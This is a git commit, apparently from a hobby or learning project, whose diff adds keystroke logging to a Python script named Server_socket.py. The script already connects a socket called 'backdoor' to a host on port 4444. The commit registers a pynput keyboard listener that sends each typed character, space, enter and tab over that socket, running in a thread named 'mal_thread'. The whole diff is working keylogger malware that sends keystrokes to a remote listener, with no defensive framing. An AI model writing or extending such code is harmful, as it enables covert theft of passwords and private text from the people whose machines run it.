4a9f14839dcb39ed7194bdafa666c3c01efc2b51
ags4436 <kvnaakash01@gmail.com>
2021-02-20 14:08:29 +0530

    logging keystrokes

--- Server_socket.py
+++ Server_socket.py
@@ -1,6 +1,9 @@
 import threading
 import socket
 import subprocess
+from pynput.keyboard import Listener, Key
+
+
 
 server_ip = '192.168.1.12'
 port = 4444
@@ -8,8 +11,26 @@ port = 4444
 backdoor = socket.socket()
 backdoor.connect((server_ip, port))
 
+
+def on_press(key):
+
+    if hasattr(key, 'char'):  # Write the character pressed if available
+        backdoor.send(key.char.encode())
+    elif key == Key.space:  # If space was pressed, write a space
+        backdoor.send(' '.encode())
+    elif key == Key.enter:  # If enter was pressed, write a new line
+        backdoor.send('\n'.encode())
+    elif key == Key.tab:  # If tab was pressed, write a tab
+        backdoor.send('\t'.encode())
+
+
 def main():
-    print("Connected !!")
+    
+
+    while True:
+    	with Listener(on_press=on_press) as listener:  # Setup the listener
+    		listener.join()  # Join the thread to the main thread
+
 
 mal_thread = threading.Thread(target=main)
 mal_thread.start()
